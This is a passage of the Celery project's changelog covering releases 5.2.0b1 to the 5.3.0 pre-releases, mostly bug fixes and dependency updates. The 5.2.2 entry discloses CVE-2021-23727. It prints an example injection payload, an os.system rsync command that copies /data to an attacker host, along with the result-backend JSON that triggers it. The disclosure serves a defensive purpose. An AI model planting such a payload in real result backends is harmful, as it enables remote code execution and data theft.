- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in #7879
- cryptography==38.0.3 by @auvipy in #7886
- Canvas.py doc enhancement by @Nusnus in #7889
- Fix typo by @sondrelg in #7890
- fix typos in optional tests by @hsk17 in #7876
- Canvas.py doc enhancement by @Nusnus in #7891
- Fix revoke by headers tests stability by @Nusnus in #7892
- feat: add global keyprefix for backend result keys by @kaustavb12 in #7620
- Canvas.py doc enhancement by @Nusnus in #7897
- fix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in #7899
- Canvas.py doc enhancement by @Nusnus in #7902
- Fix test warnings by @ShaheedHaque in #7906
- Support for out-of-tree worker pool implementations by @ShaheedHaque in #7880
- Canvas.py doc enhancement by @Nusnus in #7907
- Use bound task in base task example. Closes #7909 by @WilliamDEdwards in #7910
- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in #7914
- Stamping a task left the task properties dirty by @Nusnus in #7916
- Fixed bug when chaining a chord with a group by @Nusnus in #7919
- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by @Nusnus in #7928
- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by @Nusnus in #7929
- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by @Nusnus in #7930
- Added integration test: test_all_tasks_of_canvas_are_stamped() by @Nusnus in #7931
- Added new example for the stamping mechanism: examples/stamping by @Nusnus in #7933
- Fixed a bug where replacing a stamped task and stamping it again by @Nusnus in #7934
- Bugfix for nested group stamping on task replace by @Nusnus in #7935
- Added integration test test_stamping_example_canvas() by @Nusnus in #7937
- Fixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in #7938
- Removing as not mandatory by @auvipy in #7885
- Housekeeping for Canvas.py by @Nusnus in #7942
- Scheduled weekly dependency update for week 50 by @pyup-bot in #7954
- try pypy 3.9 in CI by @auvipy in #7956
- sqlalchemy==1.4.45 by @auvipy in #7943
- billiard>=4.1.0,<5.0 by @auvipy in #7957
- feat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in #7952
- Add broker_channel_error_retry option by @nkns165 in #7951
- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by @abs25 in #7945
- Scheduled weekly dependency update for week 51 by @pyup-bot in #7965
- Added doc to "retry_errors" newly supported field of "publish_retry_policy" of the task namespace by @Nusnus in #7967
- Renamed from master to main in the docs and the CI workflows by @Nusnus in #7968
- Fix docs for the exchange to use with worker_direct by @alessio-b2c2 in #7973
- Pin redis==4.3.4 by @auvipy in #7974
- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in #7978
- use version range redis>=4.2.2,<4.4.0 by @auvipy in #7980
- Scheduled weekly dependency update for week 01 by @pyup-bot in #7987
- Add annotations to minimise differences with celery-aio-pool's tracer.py. by @ShaheedHaque in #7925
- Fixed bug where linking a stamped task did not add the stamp to the link's options by @Nusnus in #7992
- sqlalchemy==1.4.46 by @auvipy in #7995
- pytz by @auvipy in #8002
- Fix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in #8023
- RabbitMQ links update by @arnisjuraga in #8031
- Ignore files generated by tests by @Kludex in #7846
- Revert "sqlalchemy==1.4.46 (#7995)" by @Nusnus in #8033
- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in #8034
- Fixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in #8044
- Removed duplicated import Iterable by @Nusnus in #8046
- Fix docs by @Nusnus in #8047
- Document --logfile default by @strugee in #8057
- Stamping Mechanism Refactoring by @Nusnus in #8045
- result_backend_thread_safe config shares backend across threads by @CharlieTruong in #8058
- Fix cronjob that use day of month and negative UTC timezone by @pkyosx in #8053
- Stamping Mechanism Examples Refactoring by @Nusnus in #8060
- Fixed bug in Task.on_stamp_replaced() by @Nusnus in #8061
- Stamping Mechanism Refactoring 2 by @Nusnus in #8064
- Changed default append_stamps from True to False (meaning duplicates … by @Nusnus in #8068
- typo in comment: mailicious => malicious by @yanick in #8072
- Fix command for starting flower with specified broker URL by @ShukantPal in #8071
- Improve documentation on ETA/countdown tasks (#8069) by @norbertcyran in #8075

.. _version-5.3.0b1:

5.3.0b1
=======

:release-date: 2022-08-01 5:15 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Canvas Header Stamping (#7384).
- async chords should pass it's kwargs to the group/body.
- beat: Suppress banner output with the quiet option (#7608).
- Fix honor Django's TIME_ZONE setting.
- Don't warn about DEBUG=True for Django.
- Fixed the on_after_finalize cannot access tasks due to deadlock.
- Bump kombu>=5.3.0b1,<6.0.
- Make default worker state limits configurable (#7609).
- Only clear the cache if there are no active writers.
- Billiard 4.0.1

.. _version-5.3.0a1:

5.3.0a1
=======

:release-date: 2022-06-29 5:15 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Remove Python 3.4 compatibility code.
- call ping to set connection attr for avoiding redis parse_response error.
- Use importlib instead of deprecated pkg_resources.
- fix #7245 uid duplicated in command params.
- Fix subscribed_to maybe empty (#7232).
- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) #7290.
- Add security_key_password option (#7292).
- Limit elasticsearch support to below version 8.0.
- try new major release of pytest 7 (#7330).
- broker_connection_retry should no longer apply on startup (#7300).
- Remove __ne__ methods (#7257).
- fix #7200 uid and gid.
- Remove exception-throwing from the signal handler.
- Add mypy to the pipeline (#7383).
- Expose more debugging information when receiving unknown tasks. (#7405)
- Avoid importing buf_t from billiard's compat module as it was removed.
- Avoid negating a constant in a loop. (#7443)
- Ensure expiration is of float type when migrating tasks (#7385).
- load_extension_class_names - correct module_name (#7406)
- Bump pymongo[srv]>=4.0.2.
- Use inspect.getgeneratorstate in asynpool.gen_not_started (#7476).
- Fix test with missing .get() (#7479).
- azure-storage-blob>=12.11.0
- Make start_worker, setup_default_app reusable outside of pytest.
- Ensure a proper error message is raised when id for key is empty (#7447).
- Crontab string representation does not match UNIX crontab expression.
- Worker should exit with ctx.exit to get the right exitcode for non-zero.
- Fix expiration check (#7552).
- Use callable built-in.
- Include dont_autoretry_for option in tasks. (#7556)
- fix: Syntax error in arango query.
- Fix custom headers propagation on task retries (#7555).
- Silence backend warning when eager results are stored.
- Reduce prefetch count on restart and gradually restore it (#7350).
- Improve workflow primitive subclassing (#7593).
- test kombu>=5.3.0a1,<6.0 (#7598).
- Canvas Header Stamping (#7384).

.. _version-5.2.7:

5.2.7
=====

:release-date: 2022-5-26 12:15 P.M UTC+2:00
:release-by: Omer Katz

- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (#7534).

.. _version-5.2.6:

5.2.6
=====

:release-date: 2022-4-04 21:15 P.M UTC+2:00
:release-by: Omer Katz

- load_extension_class_names - correct module_name (#7433).
    This fixes a regression caused by #7218.

.. _version-5.2.5:

5.2.5
=====

:release-date: 2022-4-03 20:42 P.M UTC+2:00
:release-by: Omer Katz

**This release was yanked due to a regression caused by the PR below**

- Use importlib instead of deprecated pkg_resources (#7218).

.. _version-5.2.4:

5.2.4
=====

:release-date: 2022-4-03 20:30 P.M UTC+2:00
:release-by: Omer Katz

- Expose more debugging information when receiving unknown tasks (#7404).

.. _version-5.2.3:

5.2.3
=====

:release-date: 2021-12-29 12:00 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Allow redis >= 4.0.2.
- Upgrade minimum required pymongo version to 3.11.1.
- tested pypy3.8 beta (#6998).
- Split Signature.__or__ into subclasses' __or__ (#7135).
- Prevent duplication in event loop on Consumer restart.
- Restrict setuptools>=59.1.1,<59.7.0.
- Kombu bumped to v5.2.3
- py-amqp bumped to v5.0.9
- Some docs & CI improvements.


.. _version-5.2.2:

5.2.2
=====

:release-date: 2021-12-26 16:30 P.M UTC+2:00
:release-by: Omer Katz

- Various documentation fixes.
- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).

    When a task fails, the failure information is serialized in the backend.
    In some cases, the exception class is only importable from the
    consumer's code base. In this case, we reconstruct the exception class
    so that we can re-raise the error on the process which queried the
    task's result. This was introduced in #4836.
    If the recreated exception type isn't an exception, this is a security issue.
    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
    by setting the task's result to a failure in the result backend with the os,
    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:

    .. code-block:: python

        {
              "exc_module": "os",
              'exc_type': "system",
              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        }

    According to my analysis, this vulnerability can only be exploited if
    the producer delayed a task which runs long enough for the
    attacker to change the result mid-flight, and the producer has
    polled for the task's result.
    The attacker would also have to gain access to the result backend.
    The severity of this security vulnerability is low, but we still
    recommend upgrading.


.. _version-5.2.1:

5.2.1
=====

:release-date: 2021-11-16 8.55 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Fix rstrip usage on bytes instance in ProxyLogger.
- Pass logfile to ExecStop in celery.service example systemd file.
- fix: reduce latency of AsyncResult.get under gevent (#7052)
- Limit redis version: <4.0.0.
- Bump min kombu version to 5.2.2.
- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.
- Remove dependency to case (#7077).
- fix: task expiration is timezone aware if needed (#7065).
- Initial testing of pypy-3.8 beta to CI.
- Docs, CI & tests cleanups.


.. _version-5.2.0:

5.2.0
=====

:release-date: 2021-11-08 7.15 A.M UTC+6:00
:release-by: Asif Saif Uddin

- Prevent from subscribing to empty channels (#7040)
- fix register_task method.
- Fire task failure signal on final reject (#6980)
- Limit pymongo version: <3.12.1 (#7041)
- Bump min kombu version to 5.2.1

.. _version-5.2.0rc2:

5.2.0rc2
========

:release-date: 2021-11-02 1.54 P.M UTC+3:00
:release-by: Naomi Elstein

- Bump Python 3.10.0 to rc2.
- [pre-commit.ci] pre-commit autoupdate (#6972).
- autopep8.
- Prevent worker to send expired revoked items upon hello command (#6975).
- docs: clarify the 'keeping results' section (#6979).
- Update deprecated task module removal in 5.0 documentation (#6981).
- [pre-commit.ci] pre-commit autoupdate.
- try python 3.10 GA.
- mention python 3.10 on readme.
- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.
- Azure blockblob backend parametrized connection/read timeouts (#6978).
- Add as_uri method to azure block blob backend.
- Add possibility to override backend implementation with celeryconfig (#6879).
- [pre-commit.ci] pre-commit autoupdate.
- try to fix deprecation warning.
- [pre-commit.ci] pre-commit autoupdate.
- not needed anyore.
- not needed anyore.
- not used anymore.
- add github discussions forum

.. _version-5.2.0rc1:

5.2.0rc1
========
:release-date: 2021-09-26 4.04 P.M UTC+3:00
:release-by: Omer Katz

- Kill all workers when main process exits in prefork model (#6942).
- test kombu 5.2.0rc1 (#6947).
- try moto 2.2.x (#6948).
- Prepared Hacker News Post on Release Action.
- update setup with python 3.7 as minimum.
- update kombu on setupcfg.
- Added note about automatic killing all child processes of worker after its termination.
- [pre-commit.ci] pre-commit autoupdate.
- Move importskip before greenlet import (#6956).
- amqp: send expiration field to broker if requested by user (#6957).
- Single line drift warning.
- canvas: fix kwargs argument to prevent recursion (#6810) (#6959).
- Allow to enable Events with app.conf mechanism.
- Warn when expiration date is in the past.
- Add the Framework :: Celery trove classifier.
- Give indication whether the task is replacing another (#6916).
- Make setup.py executable.
- Bump version: 5.2.0b3 → 5.2.0rc1.

.. _version-5.2.0b3:

5.2.0b3
=======

:release-date: 2021-09-02 8.38 P.M UTC+3:00
:release-by: Omer Katz

- Add args to LOG_RECEIVED (fixes #6885) (#6898).
- Terminate job implementation for eventlet concurrency backend (#6917).
- Add cleanup implementation to filesystem backend (#6919).
- [pre-commit.ci] pre-commit autoupdate (#69).
- Add before_start hook (fixes #4110) (#6923).
- Restart consumer if connection drops (#6930).
- Remove outdated optimization documentation (#6933).
- added https verification check functionality in arangodb backend (#6800).
- Drop Python 3.6 support.
- update supported python versions on readme.
- [pre-commit.ci] pre-commit autoupdate (#6935).
- Remove appveyor configuration since we migrated to GA.
- pyugrade is now set to upgrade code to 3.7.
- Drop exclude statement since we no longer test with pypy-3.6.
- 3.10 is not GA so it's not supported yet.
- Celery 5.1 or earlier support Python 3.6.
- Fix linting error.
- fix: Pass a Context when chaining fail results (#6899).
- Bump version: 5.2.0b2 → 5.2.0b3.

.. _version-5.2.0b2:

5.2.0b2
=======

:release-date: 2021-08-17 5.35 P.M UTC+3:00
:release-by: Omer Katz

- Test windows on py3.10rc1 and pypy3.7 (#6868).
- Route chord_unlock task to the same queue as chord body (#6896).
- Add message properties to app.tasks.Context (#6818).
- handle already converted LogLevel and JSON (#6915).
- 5.2 is codenamed dawn-chorus.
- Bump version: 5.2.0b1 → 5.2.0b2.

.. _version-5.2.0b1:

5.2.0b1
=======

:release-date: 2021-08-11 5.42 P.M UTC+3:00
:release-by: Omer Katz

- Add Python 3.10 support (#6807).
- Fix docstring for Signal.send to match code (#6835).
- No blank line in log output (#6838).
- Chords get body_type independently to handle cases where body.type does not exist (#6847).
- Fix #6844 by allowing safe queries via app.inspect().active() (#6849).
- Fix multithreaded backend usage (#6851).
- Fix Open Collective donate button (#6848).
- Fix setting worker concurrency option after signal (#6853).
- Make ResultSet.on_ready promise hold a weakref to self (#6784).
- Update configuration.rst.
- Discard jobs on flush if synack isn't enabled (#6863).
- Bump click version to 8.0 (#6861).
- Amend IRC network link to Libera (#6837).
- Import celery lazily in pytest plugin and unignore flake8 F821, "undefined name '...'" (#6872).
- Fix inspect --json output to return valid json without --quiet.
- Remove celery.task references in modules, docs (#6869).
-  The Consul backend must correctly associate requests and responses (#6823).
